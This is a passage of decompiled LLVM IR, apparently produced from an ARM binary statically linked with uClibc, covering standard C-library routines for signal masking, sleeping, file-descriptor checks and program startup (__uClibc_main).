  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-424 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_15b20 = load i32, i32* @r4, align 4
  store i32 %v3_15b20, i32* %stack_var_-20, align 4
  %v6_15b20 = load i32, i32* @r5, align 4
  %v9_15b20 = load i32, i32* @r6, align 4
  %v16_15b20 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %arg1, i32* %ip.global-to-local, align 4
  %v2_15b24 = icmp eq i32 %arg1, 0
  %v2_15b28 = ptrtoint i32* %stack_var_-424 to i32
  br i1 %v2_15b24, label %dec_label_pc_15cac, label %dec_label_pc_15b40.preheader

dec_label_pc_15b40.preheader:                     ; preds = %entry
  store i32 31, i32* %r1.global-to-local, align 4
  %v5_15b4817 = add i32 %v16_15b20, 124
  br label %dec_label_pc_15b38

dec_label_pc_15b38:                               ; preds = %dec_label_pc_15b40.preheader, %dec_label_pc_15b38
  %v5_15b4818 = phi i32 [ %v5_15b4817, %dec_label_pc_15b40.preheader ], [ %v5_15b48, %dec_label_pc_15b38 ]
  %v2_15b3c = add i32 %v5_15b4818, -136
  %v3_15b3c = inttoptr i32 %v2_15b3c to i32*
  store i32 0, i32* %v3_15b3c, align 4
  %v0_15b40.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_15b40 = add i32 %v0_15b40.pre, -1
  store i32 %v1_15b40, i32* %r1.global-to-local, align 4
  %v6_15b40 = icmp slt i32 %v1_15b40, 0
  %v4_15b48 = mul i32 %v1_15b40, 4
  %v5_15b48 = add i32 %v4_15b48, %v16_15b20
  br i1 %v6_15b40, label %dec_label_pc_15b50, label %dec_label_pc_15b38

dec_label_pc_15b50:                               ; preds = %dec_label_pc_15b38
  %v2_15b50 = ptrtoint i32* %stack_var_-156 to i32
  store i32 0, i32* @r5, align 4
  store i32 %v2_15b50, i32* @r0, align 4
  store i32 17, i32* @r1, align 4
  %v0_15b60 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_15b60, i32* %stack_var_-28, align 4
  %v0_15b68 = call i32 @__sigaddset()
  store i32 %v0_15b68, i32* %r0.global-to-local, align 4
  %v1_15b6c = load i32, i32* @r5, align 4
  %v5_15b70 = icmp slt i32 %v0_15b68, %v1_15b6c
  br i1 %v5_15b70, label %dec_label_pc_15cb4, label %dec_label_pc_15b74

dec_label_pc_15b74:                               ; preds = %dec_label_pc_15b50
  %v2_15b74 = ptrtoint i32* %stack_var_-284 to i32
  store i32 %v2_15b74, i32* @r4, align 4
  store i32 %v1_15b6c, i32* %r0.global-to-local, align 4
  store i32 %v2_15b50, i32* %r1.global-to-local, align 4
  %v3_15b84 = bitcast i32* %stack_var_-156 to %_TYPEDEF_sigset_t*
  %v4_15b84 = call i32 @__GI_sigprocmask(i32 %v1_15b6c, %_TYPEDEF_sigset_t* %v3_15b84, i32 %v2_15b74)
  store i32 %v4_15b84, i32* %r0.global-to-local, align 4
  %v1_15b88 = load i32, i32* @r5, align 4
  %v9_15b88 = icmp eq i32 %v4_15b84, %v1_15b88
  br i1 %v9_15b88, label %dec_label_pc_15b90, label %dec_label_pc_15cb4

dec_label_pc_15b90:                               ; preds = %dec_label_pc_15b74
  store i32 17, i32* %r1.global-to-local, align 4
  store i32 %v2_15b74, i32* %r0.global-to-local, align 4
  %v2_15b98 = call i32 @__sigismember(i32 %v2_15b74, i32 17)
  store i32 %v2_15b98, i32* %r0.global-to-local, align 4
  %v1_15b9c = load i32, i32* @r5, align 4
  %v9_15b9c = icmp eq i32 %v2_15b98, %v1_15b9c
  br i1 %v9_15b9c, label %dec_label_pc_15bb4.preheader, label %dec_label_pc_15b90.dec_label_pc_15c7c_crit_edge

dec_label_pc_15b90.dec_label_pc_15c7c_crit_edge:  ; preds = %dec_label_pc_15b90
  %.pre = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_15c7c

dec_label_pc_15bb4.preheader:                     ; preds = %dec_label_pc_15b90
  store i32 31, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15bac

dec_label_pc_15bac:                               ; preds = %dec_label_pc_15bb4.preheader, %dec_label_pc_15bac
  %v5_15bbc16 = phi i32 [ %v5_15b4817, %dec_label_pc_15bb4.preheader ], [ %v5_15bbc, %dec_label_pc_15bac ]
  %v2_15bb0 = add i32 %v5_15bbc16, -136
  %v3_15bb0 = inttoptr i32 %v2_15bb0 to i32*
  store i32 0, i32* %v3_15bb0, align 4
  %v0_15bb4.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_15bb4 = add i32 %v0_15bb4.pre, -1
  store i32 %v1_15bb4, i32* %r1.global-to-local, align 4
  %v6_15bb4 = icmp slt i32 %v1_15bb4, 0
  %v4_15bbc = mul i32 %v1_15bb4, 4
  %v5_15bbc = add i32 %v4_15bbc, %v16_15b20
  br i1 %v6_15bb4, label %dec_label_pc_15bc4, label %dec_label_pc_15bac

dec_label_pc_15bc4:                               ; preds = %dec_label_pc_15bac
  store i32 %v2_15b50, i32* @r0, align 4
  store i32 17, i32* @r1, align 4
  %v0_15bcc = call i32 @__sigaddset()
  store i32 %v0_15bcc, i32* %r0.global-to-local, align 4
  %v1_15bd0 = icmp slt i32 %v0_15bcc, 0
  br i1 %v1_15bd0, label %dec_label_pc_15cb4, label %dec_label_pc_15bd8

dec_label_pc_15bd8:                               ; preds = %dec_label_pc_15bc4
  store i32 17, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v4_15be4 = call i32 @__libc_sigaction(i32 17, i32* null, i32 %v2_15b28)
  store i32 %v4_15be4, i32* %r0.global-to-local, align 4
  %v1_15be8 = icmp slt i32 %v4_15be4, 0
  br i1 %v1_15be8, label %dec_label_pc_15bf0, label %dec_label_pc_15c18

dec_label_pc_15bf0:                               ; preds = %dec_label_pc_15bd8
  %v0_15bf0 = call i32 @__errno_location()
  store i32 %v2_15b74, i32* %r1.global-to-local, align 4
  store i32 %v0_15bf0, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_15c04 = inttoptr i32 %v0_15bf0 to i32*
  %v2_15c04 = load i32, i32* %v1_15c04, align 4
  store i32 %v2_15c04, i32* @r4, align 4
  %v3_15c08 = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_15c08 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_15c08, i32 0)
  store i32 -1, i32* %r0.global-to-local, align 4
  %v0_15c10 = load i32, i32* @r4, align 4
  %v1_15c10 = load i32, i32* %r5.global-to-local, align 4
  %v2_15c10 = inttoptr i32 %v1_15c10 to i32*
  store i32 %v0_15c10, i32* %v2_15c10, align 4
  %v17_15cbc.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15cb8

dec_label_pc_15c18:                               ; preds = %dec_label_pc_15bd8
  %v2_15c18 = load i32, i32* %stack_var_-424, align 4
  %v7_15c1c = icmp eq i32 %v2_15c18, 1
  %v2_15c24 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_15c24, i32* @r4, align 4
  br i1 %v7_15c1c, label %dec_label_pc_15c2c, label %dec_label_pc_15c60

dec_label_pc_15c2c:                               ; preds = %dec_label_pc_15c18
  store i32 %v2_15c24, i32* %r1.global-to-local, align 4
  store i32 %v2_15c24, i32* %r0.global-to-local, align 4
  %v2_15c34 = bitcast i32* %stack_var_-28 to %timespec*
  %v3_15c34 = call i32 @__libc_nanosleep(%timespec* %v2_15c34, i32 %v2_15c24)
  store i32 %v3_15c34, i32* %r0.global-to-local, align 4
  store i32 %v3_15c34, i32* %r6.global-to-local, align 4
  %v0_15c3c = call i32 @__errno_location()
  store i32 %v2_15b74, i32* %r1.global-to-local, align 4
  store i32 %v0_15c3c, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_15c50 = inttoptr i32 %v0_15c3c to i32*
  %v2_15c50 = load i32, i32* %v1_15c50, align 4
  store i32 %v2_15c50, i32* @r4, align 4
  %v3_15c54 = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_15c54 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_15c54, i32 0)
  store i32 %v4_15c54, i32* %r0.global-to-local, align 4
  %v0_15c58 = load i32, i32* @r4, align 4
  %v1_15c58 = load i32, i32* %r5.global-to-local, align 4
  %v2_15c58 = inttoptr i32 %v1_15c58 to i32*
  store i32 %v0_15c58, i32* %v2_15c58, align 4
  %v0_15c88.pr = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15c88

dec_label_pc_15c60:                               ; preds = %dec_label_pc_15c18
  store i32 %v2_15b74, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_15c6c = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_15c6c = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_15c6c, i32 0)
  store i32 %v4_15c6c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15c7c

dec_label_pc_15c7c:                               ; preds = %dec_label_pc_15b90.dec_label_pc_15c7c_crit_edge, %dec_label_pc_15c60
  %storemerge.pre-phi = phi i32 [ %.pre, %dec_label_pc_15b90.dec_label_pc_15c7c_crit_edge ], [ %v2_15c24, %dec_label_pc_15c60 ]
  store i32 %storemerge.pre-phi, i32* %r0.global-to-local, align 4
  store i32 %storemerge.pre-phi, i32* %r1.global-to-local, align 4
  %v2_15c80 = bitcast i32* %stack_var_-28 to %timespec*
  %v3_15c80 = call i32 @__libc_nanosleep(%timespec* %v2_15c80, i32 %storemerge.pre-phi)
  store i32 %v3_15c80, i32* %r0.global-to-local, align 4
  store i32 %v3_15c80, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15c88

dec_label_pc_15c88:                               ; preds = %dec_label_pc_15c2c, %dec_label_pc_15c7c
  %v0_15c88 = phi i32 [ %v0_15c88.pr, %dec_label_pc_15c2c ], [ %v3_15c80, %dec_label_pc_15c7c ]
  %v2_15c88 = icmp eq i32 %v0_15c88, 0
  br i1 %v2_15c88, label %dec_label_pc_15cac, label %dec_label_pc_15c90

dec_label_pc_15c90:                               ; preds = %dec_label_pc_15c88
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_15c98 = load i32, i32* %stack_var_-28, align 4
  store i32 %v3_15c98, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15cb8

dec_label_pc_15cac:                               ; preds = %entry, %dec_label_pc_15c88
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15cb8

dec_label_pc_15cb4:                               ; preds = %dec_label_pc_15b74, %dec_label_pc_15bc4, %dec_label_pc_15b50
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15cb8

dec_label_pc_15cb8:                               ; preds = %dec_label_pc_15c90, %dec_label_pc_15cac, %dec_label_pc_15bf0, %dec_label_pc_15cb4
  %v17_15cbc = phi i32 [ %v3_15c98, %dec_label_pc_15c90 ], [ 0, %dec_label_pc_15cac ], [ %v17_15cbc.pre, %dec_label_pc_15bf0 ], [ -1, %dec_label_pc_15cb4 ]
  %v2_15cbc = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_15cbc, i32* @r4, align 4
  store i32 %v6_15b20, i32* @r5, align 4
  store i32 %v9_15b20, i32* @r6, align 4
  ret i32 %v17_15cbc

; uselistorder directives
  uselistorder i32 %storemerge.pre-phi, { 1, 2, 0 }
  uselistorder i32 %v2_15c24, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_15bb4, { 0, 2, 1 }
  uselistorder i32 %v2_15b74, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32 %v1_15b6c, { 1, 0, 2 }
  uselistorder i32 %v1_15b40, { 0, 2, 1 }
  uselistorder i32 %v16_15b20, { 1, 2, 0 }
  uselistorder i32* %stack_var_-20, { 0, 2, 1 }
  uselistorder i32* %stack_var_-284, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-28, { 3, 2, 1, 5, 0, 4 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 8, 9, 10, 13, 14 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 1, 7, 6, 9, 8, 11, 10, 13, 14, 12, 16, 15, 17, 19, 18, 21, 20, 22, 0 }
  uselistorder i32 (i32, i32*, i32)* @__libc_sigaction, { 0, 2, 1 }
  uselistorder i32 (i32, i32)* @__sigismember, { 1, 0 }
  uselistorder i32 ()* @__sigaddset, { 3, 2, 0, 1, 4 }
  uselistorder i32 -136, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_15cb8, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_15cb4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15cac, { 1, 0 }
  uselistorder label %dec_label_pc_15c88, { 1, 0 }
  uselistorder label %dec_label_pc_15c7c, { 1, 0 }
  uselistorder label %dec_label_pc_15bac, { 1, 0 }
  uselistorder label %dec_label_pc_15b38, { 1, 0 }
}

define i32 @__GI___uClibc_fini(i32 %arg1) local_unnamed_addr {
dec_label_pc_15cf0:
  %stack_var_-8 = alloca i32, align 4
  %v3_15cc4 = load i32, i32* @r4, align 4
  store i32 %v3_15cc4, i32* %stack_var_-8, align 4
  %v2_15cf4 = load i32, i32* @global_var_2fb54.1213, align 4
  %v2_15cf8 = icmp eq i32 %v2_15cf4, 0
  br i1 %v2_15cf8, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_15cf0
  call void @__pseudo_branch(i32 %v2_15cf4)
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_15cf0, %bb
  %v2_15d08 = load i32, i32* @global_var_2fb58.1215, align 4
  %v2_15d0c = icmp eq i32 %v2_15d08, 0
  br i1 %v2_15d0c, label %bb12, label %bb13

bb12:                                             ; preds = %.thread
  %v3_15d10 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_15d10, i32* @r4, align 4
  %v9_15d10 = load i32, i32* @r0, align 4
  ret i32 %v9_15d10

bb13:                                             ; preds = %.thread
  call void @__pseudo_branch(i32 %v2_15d08)
  %v2_15d1c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15d1c, i32* @r4, align 4
  %v8_15d1c = load i32, i32* @r0, align 4
  ret i32 %v8_15d1c

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__pthread_return_0() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_return_void() local_unnamed_addr {
entry:
  %v1_15d38 = load i32, i32* @r0, align 4
  ret i32 %v1_15d38
}

define i32 @__check_one_fd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_15d3c = load i32, i32* @r4, align 4
  store i32 %v3_15d3c, i32* %stack_var_-12, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* %r5.global-to-local, align 4
  %v2_15d4c = call i32 @__libc_fcntl(i32 %arg1, i32 1)
  %v7_15d50 = icmp eq i32 %v2_15d4c, -1
  br i1 %v7_15d50, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v3_15d54 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_15d54, i32* @r4, align 4
  ret i32 %v2_15d4c

bb5:                                              ; preds = %entry
  %v0_15d58 = load i32, i32* @r4, align 4
  %v4_15d60 = call i32 @__libc_open(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_20ba8.1218, i32 0, i32 0), i32 %v0_15d58)
  %v1_15d64 = load i32, i32* %r5.global-to-local, align 4
  %v9_15d64 = icmp eq i32 %v4_15d60, %v1_15d64
  br i1 %v9_15d64, label %bb6, label %bb7

bb6:                                              ; preds = %bb5
  %v3_15d68 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_15d68, i32* @r4, align 4
  ret i32 %v4_15d60

bb7:                                              ; preds = %bb5
  %v0_15d6c = call i32 @abort()
  %v0_15d70 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15d70, label %bb8, label %bb9

bb8:                                              ; preds = %bb7
  %v1_15d70 = load i32, i32* @r2, align 4
  %v2_15d70 = load i32, i32* @r8, align 4
  %v5_15d70 = udiv i32 %v2_15d70, 8388608
  %v6_15d70 = and i32 %v5_15d70, %v1_15d70
  br label %bb9

bb9:                                              ; preds = %bb7, %bb8
  %v7_15d70 = phi i32 [ %v0_15d6c, %bb7 ], [ %v6_15d70, %bb8 ]
  ret i32 %v7_15d70

; uselistorder directives
  uselistorder i32 %v2_15d4c, { 1, 0 }
  uselistorder i32 ()* @abort, { 0, 2, 1, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %bb9, { 1, 0 }
}

define i32 @__GI___uClibc_init(i32 %arg1) local_unnamed_addr {
entry:
  %v2_15d78 = load i32, i32* @global_var_2fb5c.1220, align 4
  %v2_15d7c = icmp eq i32 %v2_15d78, 0
  br i1 %v2_15d7c, label %bb3, label %bb

bb:                                               ; preds = %entry
  %v6_15d88 = load i32, i32* @r0, align 4
  ret i32 %v6_15d88

bb3:                                              ; preds = %entry
  store i32 1, i32* @global_var_2fb5c.1220, align 4
  store i32 4096, i32* @global_var_2fb50.1133, align 4
  %v0_15dbc = call i32 @_stdio_init()
  ret i32 %v0_15dbc
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg3 to i32
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp36 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-120 = alloca i32, align 4
  store i32 %tmp, i32* @r6, align 4
  %v4_15dd4 = mul i32 %arg2, 4
  %v5_15dd4 = add i32 %tmp, %v4_15dd4
  %v2_15dd8 = load i32, i32* %arg3, align 4
  %v2_15ddc = ptrtoint i32* %stack_var_-120 to i32
  %v1_15de0 = add i32 %v5_15dd4, 4
  %v9_15de4 = icmp eq i32 %v1_15de0, %v2_15dd8
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg7, i32* @global_var_2fb48.1225, align 4
  store i32 %v1_15de0, i32* @global_var_2fb4c.1207, align 4
  store i32 %arg6, i32* @global_var_2fb58.1215, align 4
  store i32 120, i32* @r2, align 4
  br i1 %v9_15de4, label %bb, label %bb41

bb:                                               ; preds = %entry
  store i32 %v5_15dd4, i32* @global_var_2fb4c.1207, align 4
  br label %bb41

bb41:                                             ; preds = %entry, %bb
  store i32 %arg4, i32* @r7, align 4
  %v2_15e24 = bitcast i32* %stack_var_-120 to i8*
  %v3_15e24 = call i32 @__GI_memset(i8* %v2_15e24, i32 0)
  %storemerge.pre = load i32, i32* @global_var_2fb4c.1207, align 4
  br label %dec_label_pc_15e34

dec_label_pc_15e34:                               ; preds = %dec_label_pc_15e34, %bb41
  %storemerge = phi i32 [ %storemerge.pre, %bb41 ], [ %v4_15e34, %dec_label_pc_15e34 ]
  %v1_15e34 = inttoptr i32 %storemerge to i32*
  %v2_15e34 = load i32, i32* %v1_15e34, align 4
  %v4_15e34 = add i32 %storemerge, 4
  %v2_15e38 = icmp eq i32 %v2_15e34, 0
  br i1 %v2_15e38, label %dec_label_pc_15e44, label %dec_label_pc_15e34

dec_label_pc_15e44:                               ; preds = %dec_label_pc_15e34
  store i32 %v4_15e34, i32* @r4, align 4
  %v1_15e6422 = inttoptr i32 %v4_15e34 to i32*
  %v2_15e6423 = load i32, i32* %v1_15e6422, align 4
  %v2_15e6825 = icmp eq i32 %v2_15e6423, 0
  br i1 %v2_15e6825, label %dec_label_pc_15e70, label %dec_label_pc_15e4c

dec_label_pc_15e4c:                               ; preds = %dec_label_pc_15e44, %dec_label_pc_15e64
  %v5_15e50 = phi i32 [ %v2_15e64, %dec_label_pc_15e64 ], [ %v2_15e6423, %dec_label_pc_15e44 ]
  %v2_15e4c = icmp ugt i32 %v5_15e50, 13
  %v7_15e4c = icmp eq i32 %v5_15e50, 14
  %v2_15e50 = xor i1 %v2_15e4c, true
  %v3_15e50 = or i1 %v7_15e4c, %v2_15e50
  br i1 %v3_15e50, label %bb42, label %bb43

bb42:                                             ; preds = %dec_label_pc_15e4c
  %v6_15e50 = and i32 %v5_15e50, 536870912
  %v7_15e50 = icmp ne i32 %v6_15e50, 0
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_15e4c, %bb42
  %v1_15e5c = phi i1 [ %v2_15e4c, %dec_label_pc_15e4c ], [ %v7_15e50, %bb42 ]
  %v2_15e54 = xor i1 %v1_15e5c, true
  %v3_15e54 = or i1 %v7_15e4c, %v2_15e54
  br i1 %v3_15e54, label %bb44, label %dec_label_pc_15e64

bb44:                                             ; preds = %bb43
  br label %dec_label_pc_15e64

dec_label_pc_15e64:                               ; preds = %bb43, %bb44
  call void @__pseudo_cond_branch(i1 %v3_15e54, i32 ptrtoint (i32* @global_var_13d40.1228 to i32))
  %v0_15e60 = load i32, i32* @r4, align 4
  %v1_15e60 = add i32 %v0_15e60, 8
  store i32 %v1_15e60, i32* @r4, align 4
  %v1_15e64 = inttoptr i32 %v1_15e60 to i32*
  %v2_15e64 = load i32, i32* %v1_15e64, align 4
  %v2_15e68 = icmp eq i32 %v2_15e64, 0
  br i1 %v2_15e68, label %dec_label_pc_15e70, label %dec_label_pc_15e4c

dec_label_pc_15e70:                               ; preds = %dec_label_pc_15e64, %dec_label_pc_15e44
  %v1_15e74 = call i32 @_dl_aux_init(i32 %v2_15ddc)
  store i32 %v1_15e74, i32* @r0, align 4
  %v1_15e78 = call i32 @__GI___uClibc_init(i32 %v1_15e74)
  store i32 %v1_15e78, i32* @r0, align 4
  %v2_15e84 = icmp eq i32 %tmp37, 0
  br i1 %v2_15e84, label %bb45, label %bb46

bb45:                                             ; preds = %dec_label_pc_15e70
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_15e70, %bb45
  %v0_15e94 = phi i32 [ %tmp37, %dec_label_pc_15e70 ], [ 4096, %bb45 ]
  %v3_15e8c = icmp eq i32 %tmp36, -1
  %v8_15e8c = icmp eq i32 %tmp36, -1
  store i32 ptrtoint (i32* @global_var_2fb50.1133 to i32), i32* @r2, align 4
  store i32 %v0_15e94, i32* @global_var_2fb50.1133, align 4
  br i1 %v3_15e8c, label %dec_label_pc_15e9c, label %dec_label_pc_15ec4

dec_label_pc_15e9c:                               ; preds = %bb46
  %v0_15e9c = call i32 @getuid()
  store i32 %v0_15e9c, i32* @r0, align 4
  store i32 %v0_15e9c, i32* @r4, align 4
  %v0_15ea4 = call i32 @geteuid()
  %v0_15ea8 = load i32, i32* @r4, align 4
  %v9_15ea8 = icmp eq i32 %v0_15ea8, %v0_15ea4
  br i1 %v9_15ea8, label %dec_label_pc_15eb0, label %dec_label_pc_15eec

dec_label_pc_15eb0:                               ; preds = %dec_label_pc_15e9c
  %v1_15eb0 = call i32 @getgid(i32 %v0_15ea4)
  store i32 %v1_15eb0, i32* @r0, align 4
  store i32 %v1_15eb0, i32* @r4, align 4
  %v0_15eb8 = call i32 @getegid()
  %v0_15ebc = load i32, i32* @r4, align 4
  %v9_15ebc = icmp eq i32 %v0_15ebc, %v0_15eb8
  br i1 %v9_15ebc, label %dec_label_pc_15ec4, label %dec_label_pc_15eec

dec_label_pc_15ec4:                               ; preds = %dec_label_pc_15eb0, %bb46
  store i32 %tmp36, i32* @r2, align 4
  br i1 %v8_15e8c, label %dec_label_pc_15f58, label %dec_label_pc_15ed0

dec_label_pc_15ed0:                               ; preds = %dec_label_pc_15ec4
  %v9_15ed4 = icmp eq i32 %tmp36, %tmp35
  br i1 %v9_15ed4, label %dec_label_pc_15edc, label %dec_label_pc_15eec

dec_label_pc_15edc:                               ; preds = %dec_label_pc_15ed0
  br label %dec_label_pc_15eec

dec_label_pc_15eec:                               ; preds = %dec_label_pc_15edc, %dec_label_pc_15ed0, %dec_label_pc_15eb0, %dec_label_pc_15e9c
  %v2_15ef4 = call i32 @__check_one_fd(i32 0, i32 32768)
  %v2_15f00 = call i32 @__check_one_fd(i32 1, i32 32770)
  %v2_15f0c = call i32 @__check_one_fd(i32 2, i32 32770)
  br label %dec_label_pc_15f58

dec_label_pc_15f58:                               ; preds = %dec_label_pc_15eec, %dec_label_pc_15ec4
  %v0_15f1c = load i32, i32* @r6, align 4
  %v1_15f1c = inttoptr i32 %v0_15f1c to i32*
  %v2_15f1c = load i32, i32* %v1_15f1c, align 4
  store i32 %v2_15f1c, i32* @global_var_298c8, align 4
  store i32 %arg5, i32* @global_var_2fb54.1213, align 4
  %v2_15f58 = icmp eq i32 %arg4, 0
  br i1 %v2_15f58, label %dec_label_pc_15f94, label %bb47

bb47:                                             ; preds = %dec_label_pc_15f58
  br label %dec_label_pc_15f94

dec_label_pc_15f94:                               ; preds = %dec_label_pc_15f58, %bb47
  call void @__pseudo_branch(i32 %arg4)
  store i32 0, i32* @r5, align 4
  %v1_15fa4 = call i32 @__errno_location()
  %v2_15fac = inttoptr i32 %v1_15fa4 to i32*
  store i32 0, i32* %v2_15fac, align 4
  %v1_15fc0 = call i32 @__GI___h_errno_location()
  %v2_15fc8 = inttoptr i32 %v1_15fc0 to i32*
  store i32 0, i32* %v2_15fc8, align 4
  %v0_15fd8 = load i32, i32* @r8, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v1_15fe4 = call i32 @__GI_exit(i32 %v0_15fd8)
  ret i32 %v1_15fe4

; uselistorder directives
  uselistorder i32 %v2_15e64, { 1, 0 }
  uselistorder i32 %v1_15e60, { 1, 0 }
  uselistorder i1 %v2_15e4c, { 1, 0 }
  uselistorder i32 %v4_15e34, { 1, 0, 2 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %tmp36, { 1, 3, 0, 2 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32* @global_var_2fb50.1133, { 1, 4, 0, 2, 3 }
  uselistorder i32 14, { 2, 1, 0 }
  uselistorder i32 13, { 1, 3, 0, 2 }
  uselistorder i32 120, { 2, 0, 1 }
  uselistorder i32 %arg4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15f94, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %dec_label_pc_15e64, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %dec_label_pc_15e4c, { 1, 0 }
  uselistorder label %bb41, { 1, 0 }
}

define i32 @__libc_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  %v3_1601c = load i32, i32* @r4, align 4
  %v6_1601c = load i32, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_16020 = icmp eq i32* %arg2, null
  %v2_16024 = ptrtoint i32* %stack_var_-296 to i32
  store i32 %arg1, i32* %r6.global-to-local, align 4
  store i32 %arg3, i32* @r5, align 4
  br i1 %v2_16020, label %dec_label_pc_16090, label %dec_label_pc_16034

dec_label_pc_16034:                               ; preds = %entry
  %v2_16038 = load i32, i32* %arg2, align 4
  %v4_16038 = add i32 %tmp, 4
  store i32 %v4_16038, i32* @r1, align 4
  %v2_1603c = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_1603c, i32* @r0, align 4
  store i32 128, i32* @r2, align 4
  store i32 %v2_16038, i32* %stack_var_-156, align 4
  %v0_16048 = call i32 @memcpy()
  store i32 %v0_16048, i32* %r0.global-to-local, align 4
  %v0_1604c = load i32, i32* @r4, align 4
  %v1_1604c = add i32 %v0_1604c, 132
  %v2_1604c = inttoptr i32 %v1_1604c to i32*
  %v3_1604c = load i32, i32* %v2_1604c, align 4
  %v1_16050 = and i32 %v3_1604c, 67108864
  %v2_16050 = icmp eq i32 %v1_16050, 0
  br i1 %v2_16050, label %dec_label_pc_16064, label %bb

bb:                                               ; preds = %dec_label_pc_16034
  br label %dec_label_pc_16080

dec_label_pc_16064:                               ; preds = %dec_label_pc_16034
  %v1_1606c = and i32 %v3_1604c, 4
  %v2_1606c = icmp eq i32 %v1_1606c, 0
  br i1 %v2_1606c, label %bb21, label %bb20

bb20:                                             ; preds = %dec_label_pc_16064
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_16064, %bb20
  br label %dec_label_pc_16080

dec_label_pc_16080:                               ; preds = %bb, %bb21
  %v2_16080 = icmp eq i32 %v0_1604c, 0
  %v3_16084 = ptrtoint i32* %stack_var_-156 to i32
  %.v3_16084 = select i1 %v2_16080, i32 0, i32 %v3_16084
  %v0_16090.pre = load i32, i32* @r5, align 4
  %v0_160a0.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_16090

dec_label_pc_16090:                               ; preds = %dec_label_pc_16080, %entry
  %v0_160a0 = phi i32 [ %arg1, %entry ], [ %v0_160a0.pre, %dec_label_pc_16080 ]
  %v0_16090 = phi i32 [ %arg3, %entry ], [ %v0_16090.pre, %dec_label_pc_16080 ]
  %storemerge = phi i32 [ 0, %entry ], [ %.v3_16084, %dec_label_pc_16080 ]
